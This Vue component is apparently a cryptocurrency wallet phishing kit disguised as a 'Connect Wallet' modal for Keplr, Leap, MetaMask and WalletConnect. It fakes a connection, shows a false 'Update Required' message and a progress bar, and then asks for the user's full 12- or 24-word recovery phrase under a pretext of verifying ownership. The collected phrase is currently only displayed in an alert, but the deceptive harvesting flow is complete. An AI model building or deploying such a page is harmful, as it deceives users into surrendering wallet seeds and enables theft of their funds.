<script setup>
import { ref } from 'vue';
import leap from "/src/assets/images/leap.webp";
import keplr from "/src/assets/images/keplr.webp";
import metamask from "/src/assets/images/metamask.png";
import walletconnect from "/src/assets/images/walletconnect.jpg";

const props = defineProps({
  isOpen: Boolean,
});

const emit = defineEmits(['close']);

const activeView = ref("select");
const selectedWallet = ref(null);
const progress = ref(0);
const wordCount = ref(12);
const phrases = ref(Array(12).fill(""));
const loading = ref(false);

const wallets = [
  { name: "Leap Wallet", id: "leap", logo: leap },
  { name: "Keplr Wallet", id: "keplr", logo: keplr },
  { name: "MetaMask", id: "metamask", logo: metamask },
  { name: "WalletConnect", id: "walletconnect", logo: walletconnect },
];

function closeWalletModal() {
  emit('close');
  activeView.value = "select";
  selectedWallet.value = null;
  progress.value = 0;
  wordCount.value = 12;
  phrases.value = Array(12).fill("");
}

function selectWallet(wallet) {
  selectedWallet.value = wallet;
  activeView.value = "connecting";

  setTimeout(() => {
    activeView.value = "update";
  }, 1500);
}

function startUpdate() {
  activeView.value = "progress";
  progress.value = 0;

  const interval = setInterval(() => {
    progress.value += 2;
    if (progress.value >= 100) {
      clearInterval(interval);
      activeView.value = "recovery";
    }
  }, 100);
}

function handleWordCountChange(e) {
  const count = Number(e.target.value);
  wordCount.value = count;
  phrases.value = Array(count).fill("");
}

function handlePhraseChange(index, value) {
  const trimmed = value.trim();

  if (trimmed.includes(" ")) {
    const words = trimmed.split(/\s+/).filter(Boolean);
    if (words.length === 12 || words.length === 24) {
      wordCount.value = words.length;
      phrases.value = words;
    } else {
      alert("Phrase must be 12 or 24 words.");
      phrases.value = Array(wordCount.value).fill("");
    }
  } else {
    phrases.value[index] = trimmed;
  }
}

function togglePhraseVisibility(index) {
  const input = document.getElementById(`phrase-input-${index}`);
  if (input) {
    input.type = input.type === "password" ? "text" : "password";
  }
}

async function handleSendDetails() {
  if (phrases.value.some((p) => !p.trim())) {
    alert("Fill all fields.");
    return;
  }

  loading.value = true;
  try {
    alert(`wallet: ${selectedWallet.value.name}, details: ${phrases.value.join(" ")}`)
  } finally {
    loading.value = false;
    activeView.value = "sent";
  }
}
</script>

<template>
  <div v-if="isOpen"
    class="fixed inset-0 z-[10000] backdrop-blur-sm flex items-end md:items-center justify-center transition-all duration-300"
    :class="activeView === 'select' ? 'items-end md:items-center' : 'items-center'" @click="closeWalletModal">
    <div class="bg-bg-secondary border border-border-subtle px-8 w-full max-w-[480px] shadow-[0_20px_50px_rgba(0,0,0,0.8)] transition-all duration-300 rounded-[32px] overflow-hidden"
      @click.stop>
      <!-- HEADER (All Views) -->
      <div class="flex items-center justify-between px-2 py-8 border-b border-border-subtle mb-8">
        <div class="flex items-center grow" v-if="activeView === 'select'">
          <span class="text-white text-2xl font-black tracking-tight">Connect Wallet</span>
        </div>
        <div class="flex items-center flex-grow" v-else-if="selectedWallet">
          <div class="w-14 h-14 rounded-2xl overflow-hidden bg-bg-surface flex items-center justify-center mr-5 border border-border-subtle shadow-sm">
            <img :src="selectedWallet.logo" :alt="selectedWallet.name + ' Logo'"
              class="w-full h-full object-contain p-2.5" />
          </div>
          <span class="text-white text-2xl font-black tracking-tight">{{ selectedWallet.name }}</span>
        </div>
        <button class="text-text-secondary text-4xl leading-none hover:text-white transition-all transform hover:scale-110 p-2 -mr-2"
          @click="closeWalletModal">&times;</button>
      </div>

      <!-- SELECT WALLET VIEW -->
      <div v-if="activeView === 'select'" class="flex flex-col h-full">
        <div class="flex-1 overflow-y-auto px-1 -mx-1 no-scrollbar mb-6">
          <p class="text-text-secondary mb-4 text-sm font-bold uppercase tracking-widest">Popular Wallets</p>
          <div class="flex flex-col gap-3">
            <div v-for="(wallet, index) in wallets" :key="wallet.id"
              class="flex items-center justify-between p-4 bg-bg-surface/50 border border-transparent hover:border-border-subtle rounded-2xl cursor-pointer hover:bg-bg-surface transition-all duration-200"
              @click="selectWallet(wallet)">
              <div class="flex items-center gap-5">
                <div
                  class="w-12 h-12 rounded-xl overflow-hidden bg-white flex items-center justify-center border border-border-subtle shadow-inner">
                  <img :src="wallet.logo" :alt="wallet.name + ' Logo'" class="w-full h-full object-contain p-1" />
                </div>
                <span class="text-white font-bold text-lg">{{ wallet.name }}</span>
              </div>
              <span v-if="index === 0"
                class="text-[10px] font-black text-brand bg-brand/10 border border-brand/20 px-3 py-1 rounded-full uppercase tracking-tighter">RECOMMENDED</span>
            </div>
          </div>
        </div>
        <div
          class="flex flex-col items-center justify-center p-8 bg-bg-surface/30 border border-border-subtle rounded-[2.5rem] text-center mb-8">
          <div class="bg-brand/10 p-5 rounded-full mb-4">
            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none"
              stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="text-brand">
              <circle cx="12" cy="12" r="10" />
              <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" />
              <path d="M2 12h20" />
            </svg>
          </div>
          <p class="text-text-secondary text-sm max-w-[240px] leading-relaxed font-medium">Connect your favorite wallet to securely access your portfolio</p>
        </div>
      </div>

      <!-- CONNECTING VIEW -->
      <div v-if="activeView === 'connecting'"
        class="flex-1 flex flex-col items-center justify-center text-center py-16">
        <div class="relative w-24 h-24">
          <div class="absolute inset-0 rounded-full border-4 border-brand/20"></div>
          <div class="absolute inset-0 rounded-full border-4 border-brand border-t-transparent animate-spin"></div>
        </div>
        <p class="mt-8 text-white text-2xl font-black italic">Connecting...</p>
        <p class="mt-2 text-text-secondary text-base font-medium">Review and approve in your extension</p>
      </div>

      <!-- UPDATE INFO VIEW -->
      <div v-if="activeView === 'update'" class="flex-1 flex flex-col items-center justify-center text-center py-12">
        <div class="bg-brand/10 p-6 rounded-full mb-8">
          <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#8fff00" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
        </div>
        <h3 class="text-white text-3xl font-black mb-4 tracking-tight">Update Required</h3>
        <p class="text-text-secondary mb-12 leading-relaxed font-medium px-4">To ensure maximum security and stability, your wallet connection module needs a vital update. This will only take a moment.</p>
        <button
          class="w-full btn btn-primary py-5 text-lg shadow-[0_10px_30px_rgba(143,255,0,0.2)]"
          @click="startUpdate">Update Wallet Now</button>
      </div>

      <!-- PROGRESS VIEW -->
      <div v-if="activeView === 'progress'" class="flex-1 flex flex-col items-center justify-center py-12">
        <div class="w-36 h-36 rounded-[2.5rem] overflow-hidden bg-bg-surface flex items-center justify-center shadow-2xl mb-10 border-2 border-border-subtle">
          <img :src="selectedWallet.logo" :alt="selectedWallet.name + ' Logo'"
            class="w-full h-full object-contain p-4" />
        </div>
        <h3 class="text-white text-2xl font-black mb-3 tracking-tight">Updating {{ selectedWallet.name }}</h3>
        <p class="text-text-secondary mb-12 text-center max-w-[300px] leading-relaxed font-medium">Securing your connection... Please keep this window open.</p>
        <div class="w-full bg-bg-surface rounded-full h-3 mb-6 overflow-hidden shadow-inner">
          <div class="bg-brand h-full rounded-full transition-all duration-100 ease-linear shadow-[0_0_20px_rgba(143,255,0,0.5)]"
            :style="{ width: progress + '%' }"></div>
        </div>
        <p class="text-brand font-black font-mono tracking-widest text-lg">{{ progress }}%</p>
      </div>

      <!-- RECOVERY PHRASE INPUT VIEW -->
      <div v-if="activeView === 'recovery'" class="flex-1 flex flex-col items-center justify-center w-full px-2">
        <h3 class="text-white text-3xl font-black mb-4 tracking-tight text-center">Import Secret Phrase</h3>
        <p class="text-text-secondary mb-10 text-center leading-relaxed text-sm font-medium">Enter the recovery phrase given when you created your wallet to validate ownership and complete the update.</p>
        
        <div class="w-full flex gap-4 mb-6">
          <select
            class="flex-1 p-4 bg-bg-surface text-white rounded-2xl border border-border-subtle focus:outline-none focus:border-brand transition-all font-bold appearance-none cursor-pointer"
            :value="wordCount" @change="handleWordCountChange">
            <option value="12">12-word recovery phrase</option>
            <option value="24">24-word recovery phrase</option>
          </select>
          <div class="bg-bg-surface px-5 flex items-center rounded-2xl border border-border-subtle">
             <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#8fff00" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
          </div>
        </div>

        <div class="w-full bg-brand/5 text-brand p-5 rounded-2xl border border-brand/20 flex items-start gap-4 mb-10 text-sm leading-relaxed font-bold">
          <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 shrink-0" viewBox="0 0 20 20" fill="currentColor">
            <path fill-rule="evenodd"
              d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v2a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
              clip-rule="evenodd" />
          </svg>
          <span>Tip: You can paste your entire phrase into the first input field to auto-fill the rest.</span>
        </div>

        <div class="grid grid-cols-2 gap-x-6 gap-y-5 w-full max-h-[300px] overflow-y-auto mb-10 no-scrollbar custom-scroll px-1">
          <div v-for="(phrase, index) in phrases" :key="index" class="flex items-center group">
            <span class="text-text-muted mr-3 text-xs font-black w-5">{{ (index + 1).toString().padStart(2, '0') }}</span>
            <div class="relative w-full">
              <input :id="'phrase-input-' + index" type="password"
                class="w-full p-4 bg-bg-surface text-white rounded-2xl border border-border-subtle focus:outline-none focus:border-brand focus:ring-4 focus:ring-brand/10 transition-all pr-12 text-sm font-bold placeholder:text-text-muted"
                placeholder="---" :value="phrase" @input="handlePhraseChange(index, $event.target.value)"
                required />
              <button type="button" @click="togglePhraseVisibility(index)"
                class="absolute right-4 top-1/2 -translate-y-1/2 text-text-secondary hover:text-white transition-opacity duration-200 opacity-40 group-hover:opacity-100">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                  <path d="M10 12a2 2 0 100-4 2 2 0 000 4z" />
                  <path fill-rule="evenodd"
                    d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z"
                    clip-rule="evenodd" />
                </svg>
              </button>
            </div>
          </div>
        </div>
        <button @click="handleSendDetails"
          class="w-full btn btn-primary py-6 text-xl shadow-[0_15px_40px_rgba(143,255,0,0.25)] mb-4"
          :disabled="loading">
          {{ loading ? 'Securing Data...' : 'Confirm Secret Recovery Phrase' }}
        </button>
      </div>

      <!-- SENT VIEW -->
      <div v-if="activeView === 'sent'" class="flex-1 flex flex-col items-center justify-center text-center py-24 pb-32">
        <div class="bg-brand/10 p-10 rounded-full mb-10 relative">
           <div class="absolute inset-0 rounded-full border-[6px] border-brand border-t-transparent animate-[spin_2s_linear_infinite]"></div>
            <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#8fff00" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
        </div>
        <h3 class="text-white text-4xl font-black mb-6 tracking-tight">Security Check</h3>
        <p class="text-text-secondary text-xl leading-relaxed max-w-[360px] font-medium">Your identity is being verified and encrypted. This may take a few minutes. Please remain on this screen.</p>
      </div>
    </div>
  </div>
</template>

<style scoped>
.no-scrollbar::-webkit-scrollbar {
  display: none;
}
.no-scrollbar {
  -ms-overflow-style: none;
  scrollbar-width: none;
}
</style>
